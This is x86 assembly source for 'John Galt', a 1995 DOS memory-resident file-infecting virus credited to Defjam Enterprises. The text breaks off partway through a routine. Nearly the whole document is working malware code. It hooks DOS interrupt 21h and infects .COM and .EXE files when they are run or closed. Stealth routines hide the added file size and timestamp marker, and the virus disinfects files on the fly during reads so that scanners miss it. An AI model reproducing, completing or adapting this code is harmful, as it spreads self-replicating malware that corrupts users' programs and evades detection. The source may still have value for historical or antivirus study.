;                   Name:  John Galt
;                      Author:  RT Fishel

;                 You ask, "Who is John Galt?"
;                  The question is rhetorical
;             "Don't ask questions that cannot be answered."

;                  Initial size:  1,466 bytes
;                  XMS swap:       +169 bytes
;                  Piggybacking:    +66 bytes
;                  UMB resident:    +84 bytes

;               Copyright (C) 1995 by Defjam Enterprises

;                     Greetings to:
;             Prototype, roy g biv, Obleak, and The Gingerbread Man

;               To contact Defjam Enterprises, write to:
;               roy g biv       The Gingerbread Man
;             (programming)       (miscellaneous)
;                    P.O. Box 457,
;                     Bexley, NSW
;                   2207  AUSTRALIA




;                     DECLARATIONS

false       equ 0       ;to assist the readability of if statements
true        equ 1       ;well, anything other than 0 will suffice


;                        OPTIONS
res_umb     equ false       ;if true, go resident in UMBs
anti_pig    equ false       ;if true, use anti-anti-piggybacking techniques
xms_swap    equ false       ;if true, use extended memory swapping


;                         STUB

stub_exe    equ false       ;if true, use .EXE format as initial stub
;(otherwise .COM stub is used as default, owing to the code-restructuring)








ife     res_umb
  int12h_flag equ 1           ;this cannot be altered without size increase!    ;toggle value when hooked
  val02h_flag equ 2           ;unused
else
  useumb_flag equ 1           ;this cannot be altered without size increase!    ;toggle value when used
  int12h_flag equ 2           ;this cannot be altered without size increase!    ;toggle value when hooked
endif

val04h_flag     equ 4       ;unused
val08h_flag     equ 8       ;unused
val10h_flag     equ 10h     ;unused
closef_flag     equ 20h     ;this cannot be altered without size increase!  ;close executable suffix (either .COM or .EXE)
suffix_flag     equ 40h     ;this cannot be altered!            ;non-executable suffix (neither .COM nor .EXE)










;                     COMMENTS AT COLUMN 81

code_byte_c     equ offset code_end-offset emm_struct               ;true code size
code_word_c     equ (code_byte_c+1)/2                       ;code size rounded up to next word
stack_byte_c    equ code_byte_c+80h                         ;code size plus 128-byte stack
total_byte_c    equ total_end                           ;resident code size
com_byte_c      equ 0ffffh-stack_byte_c                     ;largest infectable .COM file size
code_resp_c     equ (total_byte_c+0fh)/10h                      ;resident code size in paragraphs

;                         CODE

.model  tiny
.386
.code

org     100h

stub:
if      stub_exe
    db      "MZ"
    dw      (offset code_end-offset stub) and 1ffh
    dw      (offset code_end-offset stub+1ffh)/200h
    dw      0
    dw      2
    dw      0
    dw      0ffffh
    dw      0fff0h
    dw      stack_byte_c+offset emm_struct-offset host+100h
    db      "GM"
    dw      offset begin-offset host+100h
    dw      0fff0h
    db      ""

host:   int     20h
    db      0
else
    db      0e9h
    dw      offset begin-offset emm_struct
endif

emm_struct:

if      xms_swap
    dd      (code_byte_c+toggle_byte-header_buffer+1) and 0fffeh        ;number of bytes to move (must be even)

emm_shandle:
    dw      0                                   ;source handle

emm_source:
    dw      offset jfar_xms-offset emm_struct+5                 ;offset into source block
    dw      0                                   ;(dword)

emm_thandle:
    dw      0                                   ;destination handle

emm_target:
    dd      0                                   ;offset into destination block
                                        ;(dword)
restore:push    ds                                  ;save DS on stack
    push    ax                                  ;save AX on stack
    push    si                                  ;save SI on stack
    push    cs                                  ;save CS on stack
    pop     ds                                  ;restore CS from stack
    mov     ah,0bh                              ;subfunction to move extended memory block
    xor     si,si                               ;zero offset of structure

jfar_xms:
    db      9ah                                 ;call xxxx:xxxx
    dd      0                                   ;address of XMS driver
    pop     si                                  ;restore SI from stack
    pop     ax                                  ;restore AX from stack
    pop     ds                                  ;restore DS from stack
    pushf                                   ;save flags on stack
    push    cs                                  ;save CS on stack
    call    int21h_subfn                            ;save offset on stack
                                        ;(simulate interrupt call)
    push    es                                  ;save ES on stack
    push    ax                                  ;save AX on stack
    push    cx                                  ;save CX on stack
    push    di                                  ;save DI on stack
    push    2           ;repz stosw     clear buffer
    push    0ca075859h      ;lahf             save flags in AH
    push    5f9e0ec4h       ;add sp,+0e           skip code in stack
    push    839fabf3h       ;sahf             restore flags from AH
                             ;(because ADD alters carry)
                ;pop di,cx,ax,es      restore registers
                ;retf 2           return from interrupt
    mov     ax,sp                               ;point to clear buffer code
    push    ss                                  ;save SS on stack
    push    ax                                  ;save offset on stack
                                        ;(simulate far call)
    push    cs                                  ;save CS on stack
    pop     es                                  ;restore CS from stack
    mov     ax,0                                ;zero AX without altering carry
    mov     cx,((code_byte_c+(toggle_byte-header_buffer)-(offset jfar_xms-offset emm_struct+5)+1) and 0fffeh)/2
                                        ;number of words to clear
    mov     di,offset jfar_xms-offset emm_struct+5              ;offset of buffer to clear
    retf                                    ;return from far call
endif

int21h_subfn:
    push    si                                  ;save SI on stack
    pusha                                   ;save all registers on stack
    mov     cx,(offset call_21h-offset op_table)/3              ;opcode table length
    mov     si,offset op_table-offset emm_struct-2              ;offset of table of opcodes
    cld                                     ;set index direction to forward
                                        ;(just in case)
find_op:inc     si                                  ;skip low byte of opcode address
    inc     si                                  ;skip high byte of opcode address

;  using CMPSW here, to save a byte, will result in a system hang, if DI=FFFFh

    db      2eh                                 ;CS:
                                        ;(to avoid having to save and set DS)
    lodsb                                   ;retrieve opcode from table
    cmp     al,ah                               ;check opcode
    loopnz  find_op                             ;branch if not handled but opcodes remain
    push    word ptr cs:[si]                        ;save handler address on stack
    mov     bp,sp                               ;point to current top of stack
    pop     word ptr ss:[bp+12h]                        ;restore handler address from stack
                                        ;(saves handler address at top of stack)
                                        ;(simulate subroutine call)
    popa                                    ;restore all registers from stack

known_ret:
    ret                                     ;return from subroutine

op_table:
    db      11h                                 ;find first (FCB)
    dw      offset hide_length-offset emm_struct
    db      12h                                 ;find next (FCB)
    dw      offset hide_length-offset emm_struct
    db      1dh                                 ;call sign
    dw      offset call_sign-offset emm_struct

if      anti_pig
    db      36h                                 ;get free disk space
    dw      offset fake_space-offset emm_struct
endif

    db      3eh                                 ;close file
    dw      offset do_close-offset emm_struct
    db      3fh                                 ;read file
    dw      offset do_disinf-offset emm_struct
    db      40h                                 ;write file
    dw      offset do_disinf-offset emm_struct
    db      42h                                 ;set file pointer
    dw      offset check_disinf-offset emm_struct
    db      4bh                                 ;load file
    dw      offset check_infect-offset emm_struct
    db      4eh                                 ;find first (DTA)
    dw      offset hide_length-offset emm_struct
    db      4fh                                 ;find next (DTA)
    dw      offset hide_length-offset emm_struct
    db      57h                                 ;get/set file date and time
    dw      offset fix_time-offset emm_struct

default_handler:
    db      0                          ;this must not be removed       ;corresponds to anything else
    dw      offset cmp_subfn-offset emm_struct     ;this must not be removed

;              adding new opcode handlers is very simple -
;        simply insert the value of the opcode to intercept (AH only!),
;          and the address of the handler, ABOVE the default handler

call_21h:
    pushf                                   ;save flags on stack
    push    cs                                  ;save code segment on stack
    push    offset known_ret-offset emm_struct                  ;save offset of a known RET on stack

cmp_subfn:
    cmp     ah,00                               ;check subfunction number
                                        ;(the value here is altered as required)
    ja      jfar_21h                            ;branch if greater than largest file subfunction

jfar_1: db      0eah                                ;jmp xxxx:xxxx
    dd      0                                   ;original interrupt 21h address here

jfar_21h:
    db      0eah                                ;jmp xxxx:xxxx
    dd      0                                   ;original interrupt 21h address here

call_sign:
    cmp     al,0edh                             ;check low half of call sign
    jnz     jfar_21h                            ;branch if not 0ed
    mov     ax,0feebh                               ;return sign
    iret                                    ;return from interrupt

hide_length:
    push    ax                                  ;save requested operation on stack
    call    call_21h                            ;find file
    pushf                                   ;save flags on stack
    push    bp                                  ;save BP on stack
    mov     bp,sp                               ;point to current top of stack
    test    byte ptr ss:[bp+5],40h                      ;check requested operation
    jz      save_code                               ;branch if FCB find

;       this saves virtually duplicating this procedure for AH=4Eh,4Fh

    push    word ptr ss:[bp+2]                          ;save flags on stack
    pop     word ptr ss:[bp+0ah]                        ;restore flags from stack (save as original)

save_code:
    mov     word ptr ss:[bp+4],ax                       ;save return code on stack
    lahf                                    ;store flags in AH
    pop     bp                                  ;restore BP from stack
    popf                                    ;restore flags from stack
    test    al,al                               ;check return code
    jnz     quit_hide                               ;branch if error occurred
    push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    push    bx                                  ;save BX on stack
    sahf                                    ;store AH in flags
    pushf                                   ;save flags on stack
    jnz     skip_chkdsk                             ;branch if chkdsk check irrelevent
    call    get_psp                             ;retrieve PSP segment
    mov     es,bx                               ;move PSP segment into ES
    cmp     word ptr es:[16h],bx                        ;compare current PSP with parent PSP
    jnz     nohide                              ;branch if PSPs differ
                                        ;(this prevents CHKDSK errors!)
skip_chkdsk:
    mov     ah,2fh                              ;subfunction to retrieve DTA address
    mov     bx,dx                               ;move offset of FCB into BX
    mov     al,byte ptr ds:[bx]                         ;retrieve FCB type
    call    call_21h                            ;retrieve DTA address
    inc     al                                  ;check FCB type
    jnz     time_adjust                             ;branch if not extended FCB
    add     bx,7                                ;allow for additional bytes

time_adjust:
    popf                                    ;restore flags from stack
    pushf                                   ;save flags on stack
    jz      getime                              ;branch if FCB find
    dec     bx                                  ;adjust offset for DTA find

getime: push    es                                  ;save DTA segment on stack
    pop     ds                                  ;restore DTA segment from stack
    mov     al,byte ptr ds:[bx+17h]                     ;retrieve file time from FCB
    and     al,1fh                              ;convert time to seconds only
    sub     al,1dh                              ;subtract 58 seconds
    jbe     nohide                              ;branch if file is not infected
    sub     byte ptr ds:[bx+17h],al                     ;set 58 seconds
    popf                                    ;restore flags from stack
    pushf                                   ;save flags on stack
    jz      adjust_size                             ;branch if FCB find
    dec     bx
    dec     bx                                  ;adjust offset for DTA find

adjust_size:
    sub     dword ptr ds:[bx+1dh],code_byte_c                   ;hide file length increase

nohide: popf                                    ;restore flags from stack
    pop     bx                                  ;restore BX from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack

quit_hide:
    pop     ax                                  ;restore return code from stack
    iret                                    ;return from interrupt

check_infect:
    cmp     al,2                                ;reserved...
    jz      jfar_1                              ;branch to original interrupt 21h handler
    cmp     al,3                                ;load overlay...
    ja      jfar_1                              ;branch to original interrupt 21h handler
    push    es                                  ;save ES on stack
    push    ds                                  ;save DS on stack
    push    bp                                  ;save BP on stack
    push    di                                  ;save DI on stack
    push    si                                  ;save SI on stack
    push    dx                                  ;save DX on stack
    push    cx                                  ;save CX on stack
    push    bx                                  ;save BX on stack
    push    ax                                  ;save AX on stack
    push    ax                                  ;save requested operation on stack
    push    bx                                  ;save parameter block offset on stack
    call    get_psp                             ;get current PSP segment
    mov     fs,bx                               ;store PSP segment in FS
    pop     bx                                  ;restore parameter block offset from stack
    pop     ax                                  ;restore requested operation from stack
    test    al,al                               ;check requested operation
    jnz     debug_load                              ;branch if load only or load overlay

;                 device drivers are loaded with 4B03h
;         if you don't support device drivers, do NOT alter the code
;          otherwise, device drivers will be infected as .COM files

    push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
    and     byte ptr cs:[toggle_byte],not suffix_flag               ;specify file to be infected
    push    offset attrib_cont-offset emm_struct                ;save offset on stack
                                        ;(simulate subroutine call)
hook_24h:
    mov     ax,offset new_24h-offset emm_struct                 ;offset of new interrupt 24h handler
    mov     cx,cs                               ;code segment of new interrupt 24h handler
    jmp     store_24h                               ;branch to hook interrupt 24h

restore_24h:
    mov     ax,"MG"     ;(correct order when dumped)            ;offset of original interrupt 24h handler
    mov     cx,"MG"     ;(correct order when dumped)            ;code segment of original interrupt 24h handler
                                        ;(the value here is altered as required)
store_24h:
    push    0                                   ;save 0 on stack
    pop     ds                                  ;set DS to 0
    mov     si,90h                              ;offset of interrupt 24h in interrupt table
    xchg    ax,word ptr ds:[si]                         ;exchange old offset with new offset
    mov     word ptr cs:[offset restore_24h-offset emm_struct+1],ax     ;save old interrupt 24h offset
    lodsw                                   ;skip 2 bytes in source
    xchg    cx,word ptr ds:[si]                         ;exchange old code segment with new code segment
    mov     word ptr cs:[offset restore_24h-offset emm_struct+4],cx     ;save old interrupt 24h code segment

hook_ret:
    ret                                     ;return from subroutine

attrib_cont:
    push    es                                  ;save ES on stack
    pop     ds                                  ;restore DS from stack
    mov     ax,3d00h                            ;subfunction to open file
    call    call_21h                            ;open file
    jb      bad_op                              ;branch if error
    xchg    bx,ax                               ;move handle number into BX
    push    offset bad_rd-offset emm_struct                 ;save offset on stack
                                        ;(simulate subroutine call)
check_file:
    call    check_seconds                           ;check if file already infected
    jz      hook_ret                            ;branch if file is already infected
    push    ax                                  ;save file time on stack
    push    dx                                  ;save file date on stack
    call    infect                              ;infect file
    pop     dx                                  ;restore file date from stack
    pop     cx                                  ;restore file time from stack
    jb      hook_ret                            ;branch if error
    mov     ax,5701h                            ;subfunction to set file date and time
    jmp     call_21h                            ;set file date and time

bad_rd: mov     ah,3eh                              ;subfunction to close file
    call    call_21h                            ;close file

bad_op: call    restore_24h                             ;restore interrupt 24h
    popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack
    push    ds                                  ;save DS on stack
    push    es                                  ;save parameter block segment on stack
    pop     ds                                  ;restore parameter block segment from stack
    push    cs                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    inc     ax                                  ;set operation to load only
    mov     cx,7                                ;parameter block byte-count
    mov     si,bx                               ;move offset of parameter block into SI
    mov     bx,header_buffer+0ah                        ;area to store parameter block
    mov     di,bx                               ;move offset of area into DI
    repz    movsw                               ;save parameter block
    pop     ds                                  ;restore DS from stack
                                        ;(simulate interrupt call)
debug_load:
    push    bx                                  ;save BX on stack
    call    call_21h                            ;load file
    mov     bp,sp                               ;store current stack pointer in BP
    xchg    ax,word ptr ss:[bp+2]                       ;exchange return code with requested operation
    mov     word ptr ss:[bp+4],bx                       ;save destroyed BX
    xchg    dx,word ptr ss:[bp+8]                       ;exchange destroyed DX with original DX
    xchg    bp,ax                               ;store requested operation in BP
    pop     bx                                  ;restore DX from stack
    jb      debug_ret                               ;branch if error
    mov     word ptr fs:[2eh],sp                        ;set register table offset
    mov     ax,3d00h                            ;subfunction to open file
    push    bx                                  ;save BX on stack
    call    call_21h                            ;open file for read only
    xchg    bx,ax                               ;move handle number into BX
    push    offset restore_header-offset emm_struct             ;save offset on stack
                                        ;(simulate subroutine call)
check_seconds:
    mov     ax,5700h                            ;subfunction to retrieve file date and time
    call    call_21h                            ;retrieve file date and time
    mov     ax,cx                               ;move seconds into AX
    or      al,1fh                              ;set entire seconds field
    xor     cl,al                               ;check for 62 seconds
    ret                                     ;return from subroutine

restore_header:
    pushf                                   ;save result on stack
    call    read_header                             ;read first 18h bytes
    mov     ah,3eh                              ;subfunction to close file
    call    call_21h                            ;close file
    xchg    bp,dx                               ;area containing original header
    popf                                    ;retrieve infection result from stack
    pop     bx                                  ;restore BX from stack
    jnz     okay_debug                              ;branch if file is not infected
    mov     ds,word ptr es:[bx]                         ;get destination segment
    xor     di,di                               ;set destination offset to 0
    cmp     dl,3                                ;check requested operation
    jz      test_debug                              ;branch if load overlay
    lds     di,dword ptr es:[bx+12h]                    ;retrieve address of child process

test_debug:
    cmp     byte ptr cs:[bp],0e9h                       ;check file type
    jnz     debug_exe                               ;branch if .EXE file
    lea     si,word ptr [di+offset exe_buffer-offset begin+3]           ;offset of original .COM code
    add     si,word ptr ds:[di+1]                       ;point at original header
    push    ds                                  ;save initial code segment on stack
    pop     es                                  ;restore initial code segment from stack
    movsb
    movsw                                   ;restore original 3 bytes of .COM file
    sub     si,offset exe_buffer-offset emm_struct+3            ;offset of viral code
    push    si                                  ;save viral code offset on stack
    jmp     clear_area                              ;branch to clear memory of code

debug_exe:
    cmp     dl,3                                ;restore requested operation result from stack
    jnz     disinf_exe                              ;branch if not load overlay
    mov     ax,ds                               ;move DS into AX
    add     ax,word ptr cs:[bp+16h]                     ;add initial CS
    mov     es,ax                               ;move destination segment into ES
    mov     ax,word ptr cs:[bp+14h]                     ;retrieve initial IP
    sub     ax,offset begin-offset emm_struct                   ;point to start of viral code
    push    ax                                  ;save initial IP on stack
    jmp     clear_area                              ;branch to clear memory of code

disinf_exe:
    lea     si,word ptr [di+offset exe_buffer-offset begin+0eh]         ;offset of original .EXE code
    lea     di,word ptr [bx+0eh]                        ;offset of end of original parameter block
    call    get_psp                             ;retrieve PSP segment
    add     bx,10h                              ;point to first allocated segment
    lodsw                                   ;retrieve stack segment
    add     ax,bx                               ;relocate for actual memory segment
    xchg    cx,ax                               ;store stack segment in CX
    lodsw                                   ;retrieve stack pointer
    dec     ax                                  ;reduce stack pointer by 1
    dec     ax                                  ;reduce stack pointer by 1
    stosw                                   ;store stack pointer in parameter block
    mov     gs,cx                               ;store stack segment in FS
    xchg    bp,ax                               ;store stack pointer in BP
    mov     word ptr gs:[bp],0                          ;simulate pass parameter to child process
    xchg    cx,ax                               ;store stack segment in AX
    stosw                                   ;save stack segment in parameter block
    lodsw                                   ;skip checksum (waste of 2 bytes!)
    mov     ax,word ptr es:[di]                         ;retrieve initial IP
    sub     ax,offset begin-offset emm_struct                   ;point to start of viral code
    push    ax                                  ;save instruction pointer on stack
    movsw                                   ;store instruction pointer in parameter block
    lodsw                                   ;retrieve code segment
    add     ax,bx                               ;relocate for actual memory segment
    stosw                                   ;store code segment in parameter block
    push    ds                                  ;save initial code segment on stack
    pop     es                                  ;restore initial code segment from stack

clear_area:
    xor     ax,ax                               ;set store byte to 0
    mov     cx,code_word_c                          ;number of words to clear
    pop     di                                  ;restore viral code offset from stack
    repz    stosw                               ;clear viral code from host file in memory

okay_debug:
    cmp     dl,3                                ;check requested operation
    jz      debug_ret                               ;branch if load overlay
    call    test_int12h                             ;check if interrupt 12h already hooked
    mov     bp,sp                               ;point to current top of stack
    lds     ax,dword ptr ss:[bp+12h]                    ;retrieve termination address
    test    dl,dl                               ;check requested operation
    jnz     set_terminate                           ;branch if not load and execute
    push    cs                                  ;store CS on stack
    pop     ds                                  ;restore CS from stack
    mov     ax,offset terminate-offset emm_struct               ;offset of new termination handler

if      anti_pig
    mov     byte ptr ds:[offset fake_drive-offset emm_struct+1],dl      ;clear drive number
endif

set_terminate:
    mov     di,0ah                              ;offset of termination handler address
    stosw                                   ;store new termination handler offset
    mov     ax,ds                               ;store termination segment in AX
    stosw                                   ;store new termination handler segment
    push    es                                  ;save ES on stack
    pop     ds                                  ;restore ES from stack
    jnz     debug_ret                               ;branch if not load and execute
    push    ss                                  ;save SS on stack
    pop     es                                  ;restore SS from stack
    mov     cl,0ch                              ;number of words to move
    mov     si,sp                               ;point to current bottom of stack
    sub     sp,6                                ;adjust new bottom of stack
    mov     di,sp                               ;point to new bottom of stack
    db      36h                                 ;SS:
                                        ;(to avoid having to set DS)
    repz    movsw                               ;move register table
                                        ;(duplicates return address to allow IRET)
    mov     word ptr fs:[2eh],sp                        ;set register table offset
    push    ds                                  ;save DS on stack
    pop     es                                  ;restore ES from stack
    mov     bx,scratch_area                         ;area containing parameter block
    lss     sp,dword ptr cs:[bx]                        ;restore original stack address
    pop     ax                                  ;restore passed parameter from stack
    jmp     dword ptr cs:[bx+4]                         ;branch to host code

debug_ret:
    pop     ax                                  ;restore AX from stack
    pop     bx                                  ;restore BX from stack
    pop     cx                                  ;restore CX from stack
    pop     dx                                  ;restore DX from stack
    pop     si                                  ;restore SI from stack
    pop     di                                  ;restore DI from stack
    pop     bp                                  ;restore BP from stack
    pop     ds                                  ;restore DS from stack
    pop     es                                  ;restore ES from stack

terminate:
    retf    2                                   ;return from interrupt with flags set

if      anti_pig
fake_space:
    push    ds                                  ;save DS on stack
    push    cs                                  ;save CS on stack
    pop     ds                                  ;retrieve CS from stack
    mov     al,dl                               ;move drive number into AL
    test    al,al                               ;check drive number
    jnz     fake_drive                              ;branch if not default drive
    mov     ah,19h                              ;subfunction to get current drive
    call    call_21h                            ;get current drive
    inc     ax                                  ;skip default drive

fake_drive:
    cmp     al,0                                ;check current drive
    jz      return_space                            ;branch if space already retrieved
    mov     byte ptr ds:[offset fake_drive-offset emm_struct+1],al      ;save current drive
    mov     ah,36h                              ;subfunction to get free disk space
    call    call_21h                            ;get free disk space
    push    si                                  ;save SI on stack
    mov     si,offset return_space-offset emm_struct+1              ;offset of area to store disk space
    mov     word ptr ds:[si],ax                         ;store sectors per cluster
    mov     word ptr ds:[si+3],bx                       ;store number of free clusters
    mov     word ptr ds:[si+6],cx                       ;store bytes per sector
    mov     word ptr ds:[si+9],dx                       ;store total clusters on drive
    pop     si                                  ;restore SI from stack
    jmp     return_space                            ;flush cache

return_space:
    mov     ax,"MG"     ;(correct order when dumped)            ;set sectors per cluster
    mov     bx,"MG"     ;(correct order when dumped)            ;set number of free clusters
    mov     cx,"MG"     ;(correct order when dumped)            ;set bytes per sector
    mov     dx,"MG"     ;(correct order when dumped)            ;set total clusters on drive
    pop     ds                                  ;restore DS from stack
    iret                                    ;return from interrupt
endif

new_24h:mov     al,3                                ;abort on critical error (for interrupt 24h)
    iret                                    ;return from interrupt

infect: mov     ax,1220h                            ;subfunction to get address of JFT
    int     2fh                                 ;get address of JFT
    mov     ax,1216h                            ;subfunction to get address of SFT
    push    bx                                  ;save handle number on stack
    mov     bl,byte ptr es:[di]                         ;get SFT number
    int     2fh                                 ;get address of SFT
    pop     bx                                  ;restore handle number from stack
    or      byte ptr es:[di+5],bh                       ;check device information

;this is fairly safe - if handle is greater than 255, the following will happen:

;             if it's a device, the redirection might be altered,
;              that's okay because it will be closed immediately

;            if it's a file, the drive might be altered... too bad
;              that's okay too - get a read error, close the file

    js      sml_file                            ;branch if device (CON, PRN, etc)

; this check is required because devices can be opened and closed like files!
;           (and a read of CON is a wait for keyboard input)

    mov     byte ptr es:[di+2],2                        ;set open mode to read/write in SFT
    push    offset infect_cont-offset emm_struct                ;save return address on stack

read_header:
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     ah,3fh                              ;subfunction to read from file
    mov     cx,18h                              ;number of bytes in header
    mov     dx,header_buffer                        ;offset of original header
    jmp     call_21h                            ;read .EXE header

infect_cont:
    xor     ax,cx                               ;ensure all bytes read
    jnz     sml_file                            ;branch if error or file smaller than 18h bytes
    push    ds                                  ;save code segment on stack
    pop     es                                  ;restore code segment from stack
    mov     ax,"MZ"                             ;set initial header ID to 'ZM'
    mov     si,dx                               ;move offset of original buffer into SI
    cmp     word ptr ds:[si],ax                         ;check contents of header
    xchg    ah,al                               ;switch to 'MZ'
    jz      save_type                               ;branch if header contains 'ZM'
    cmp     word ptr ds:[si],ax                         ;check if header contains 'MZ'

save_type:
    pushf                                   ;save file type result on stack
    mov     di,offset exe_buffer-offset emm_struct              ;offset of area to store original header
    repz    movsb                               ;save header
    mov     di,dx                               ;move offset of original buffer into DI
    jnz     check_suffix                            ;branch if not .EXE file
    mov     word ptr ds:[di],ax                         ;save 'MZ' in header
    jmp     find_eof                            ;branch to get file size

check_suffix:
    test    byte ptr ds:[di+toggle_byte-header_buffer],suffix_flag      ;check suffix flag
    jnz     not_exe                             ;branch if not executable suffix

find_eof:
    cwd                                     ;set low file pointer position to 0
    call    set_efp                             ;subfunction to set file pointer
    mov     word ptr ds:[di+scratch_area-header_buffer],ax          ;save low file size
    mov     word ptr ds:[di+scratch_area-header_buffer+2],dx        ;save high file size
    popf                                    ;restore file type result from stack
    jz      overlay_check                           ;branch if .EXE file
    cmp     ax,com_byte_c+1                         ;check size of file + virus
    jnb     sml_file                            ;branch if maximum file size exceeded
    push    di                                  ;save offset of header on stack
    mov     byte ptr ds:[di],0e9h                       ;save initial jump in file
    inc     di                                  ;skip 1 byte in destination
    add     ax,offset begin-offset emm_struct-3                 ;calculate offset of viral code in file

save_init:
    stosw                                   ;store offset of jump to viral code in file
    pop     di                                  ;restore offset of header from stack
    jmp     ok_com                              ;branch to write viral code

not_exe:pop     ax                                  ;discard 2 bytes from stack

sml_file:
    stc                                     ;specify error occurred
    ret                                     ;return from subroutine

overlay_check:
    cmp     word ptr ds:[di+0ch],cx                     ;check value of maxalloc
    jz      sml_file                            ;branch if load to top of memory
    mov     ch,2                                ;set divisor to 200h
    div     cx                                  ;calculate number of 512-byte pages
    test    dx,dx                               ;check last page size
    jz      skip_page                               ;branch if 512-byte aligned
    inc     ax                                  ;add last page to count

skip_page:
    cmp     word ptr ds:[di+4],ax                       ;check high file size
    jnz     sml_file                            ;branch if file contains overlay data
    cmp     word ptr ds:[di+2],dx                       ;check low file size
    jnz     sml_file                            ;branch if file contains overlay data
    les     ax,dword ptr ds:[di+scratch_area-header_buffer]         ;retrieve file size
    mov     dx,es                               ;move high file size into DX
    push    ax                                  ;save low file size on stack
    push    dx                                  ;save high file size on stack
    add     ax,code_byte_c                          ;add code byte count
    adc     dx,0                                ;calculate new file size
    div     cx                                  ;calculate number of 512-byte pages
    test    dx,dx                               ;check last page size
    jz      save_size                               ;branch if 512-byte page aligned
    inc     ax                                  ;add last page to count

save_size:
    mov     word ptr ds:[di+2],dx                       ;store number of bytes in last page
    mov     word ptr ds:[di+4],ax                       ;store number of pages
    pop     dx                                  ;restore high file size from stack
    pop     ax                                  ;restore low file size from stack
    mov     cx,10h                              ;number of bytes in a paragraph
    div     cx                                  ;convert header size from paragraphs to bytes
    sub     ax,word ptr ds:[di+8]                       ;subtract header size from new file size
    add     dx,offset begin-offset emm_struct                   ;set instruction pointer to start of viral code
    mov     word ptr ds:[di+14h],dx                     ;store new initial instruction pointer
    mov     word ptr ds:[di+16h],ax                     ;store new inital code segment
    add     dx,stack_byte_c-(offset begin-offset emm_struct)        ;set stack pointer to end of viral code
    mov     word ptr ds:[di+0eh],ax                     ;store new initial stack pointer
    mov     word ptr ds:[di+10h],dx                     ;store new initial stack segment
    xor     dx,dx                               ;set write offset to 0

ok_com:
if      xms_swap
    xor     si,si                               ;point to start of EMM structure
    call    swap_info                               ;restore original structure information
endif

    mov     cx,code_byte_c                          ;number of bytes in viral code
    call    write_file                              ;write viral code

if      xms_swap
    xor     si,si                               ;point to start of EMM structure
    call    swap_info                               ;restore resident structure information
endif

    push    offset write_cont-offset emm_struct                 ;save return address on stack

set_zfp:xor     cx,cx                               ;set high file pointer position to 0
    mov     dx,cx                               ;set low file pointer position to 0

set_fp: mov     ax,4200h                            ;subfunction to set file pointer
    db      38h                                 ;dummy operation to mask MOV

set_efp:mov     ax,4202h                            ;subfunction to set file pointer

jmp_21h:jmp     call_21h                            ;set file pointer

write_cont:
    mov     dx,di                               ;move address of header into DX

write_cx:
    mov     cx,18h                              ;number of bytes in header

write_file:
    mov     ah,40h                              ;subfunction to write file
    jmp     jmp_21h                             ;write new file header

do_close:
    push    ds                                  ;save DS on stack
    push    es                                  ;save ES on stack
    pusha                                   ;save all registers on stack
    call    hook_24h                            ;hook interrupt 24h
    call    set_zfp                             ;set file pointer to start of file
    or      byte ptr cs:[toggle_byte],suffix_flag               ;update suffix flag in toggle
                                        ;(clear if executable, set if not)
    call    check_file                              ;check if file already infected
    call    restore_24h                             ;restore interrupt 24h
    popa                                    ;restore all registers from stack
    pop     es                                  ;restore ES from stack
    pop     ds                                  ;restore DS from stack

close_file:
    jmp     jfar_1                              ;close file

check_disinf:
    cmp     al,2                                ;check requestion operation
    jnz     close_file                              ;branch if not set from end of file

do_disinf:
    pusha                                   ;save all registers on stack
    call    check_seconds                           ;check if file already infected
    popa                                    ;restore all registers from stack
    jnz     close_file                              ;branch if file is not infected
    cmp     ah,42h                              ;check requested operation
    jnz     read_or_write                           ;branch if not set file pointer
    push    cx                                  ;save high file pointer position on stack
    sub     dx,code_byte_c                          ;hide viral code size from file pointer
    sbb     cx,0                                ;allow for page shift
    call    call_21h                            ;set file pointer into original host file
    pop     cx                                  ;restore high file pointer position from stack
    retf    2                                   ;return from interrupt with flags set

read_or_write:
    pusha                                   ;save all registers on stack
    push    ds                                  ;save segment of buffer on stack
    push    dx                                  ;save offset of buffer on stack
    push    cs                                  ;save code segment on stack
    pop     ds                                  ;restore code segment from stack
    mov     ax,4201h                            ;subfunction to retrieve file pointer
    xor     cx,cx                               ;set high file pointer position to 0
    cwd                                     ;set low file pointer position to 0
    call    call_21h                            ;retrieve current file pointer position
    mov     si,scratch_area                         ;offset of scratch area
    mov     word ptr ds:[si],ax                         ;save low file pointer position
    mov     word ptr ds:[si+2],dx                       ;save high file pointer position
    dec     cx                                  ;set high file pointer position to -1
    mov     dx,not (code_byte_c-1)                      ;set low file pointer position to end of host
    call    set_efp                             ;retrieve original host file size
    mov     word ptr ds:[si+4],ax                       ;save low file pointer position
    mov     word ptr ds:[si+6],dx                       ;save high file pointer position
    mov     bp,sp                               ;point to current top of stack
    cmp     byte ptr ss:[bp+13h],3fh                    ;check requested operation
    jz      read_file                               ;branch if read
    mov     dx,offset exe_buffer-offset code_end                ;point to original header in viral code
    call    set_efp                             ;set file pointer to original host header
    call    read_header                             ;read bytes
    jb      disinf_fp                               ;branch if error (opened for write only)
    push    dx                                  ;save buffer address on stack
    call    set_zfp                             ;set file pointer position to start of file
    pop     dx                                  ;restore buffer address from stack
    call    write_cx                            ;write original header
    mov     cx,word ptr ds:[si+6]                       ;restore high file pointer position
    mov     dx,word ptr ds:[si+4]                       ;restore low file pointer position
    call    set_fp                              ;set file pointer position to original host end
    xor     cx,cx                               ;number of bytes to write
    call    write_file                              ;truncate file (set to original length)
    mov     ax,5700h                            ;subfunction to get file time
    call    call_21h                            ;get file time
    inc     ax                                  ;set subfunction to set file time
    dec     cx                                  ;set 60 seconds
    dec     cx                                  ;set 58 seconds
    call    call_21h                            ;set uninfected file time

disinf_fp:
    mov     cx,word ptr ds:[si+2]                       ;restore high file pointer position
    mov     dx,word ptr ds:[si]                         ;restore low file pointer position
    call    set_fp                              ;set file pointer position to initial position
    pop     ax                                  ;discard 2 bytes from stack
    pop     ds                                  ;restore segment of buffer from stack
    popa                                    ;restore all registers from stack
    jmp     jfar_1                              ;proceed with write operation

read_file:
    inc     cx                                  ;set CX to 0
    cmp     word ptr ds:[si+2],cx                       ;check high file pointer position
    jnz     not_header                              ;branch if high file pointer position > 64k
    mov     ax,18h                              ;bytes in header
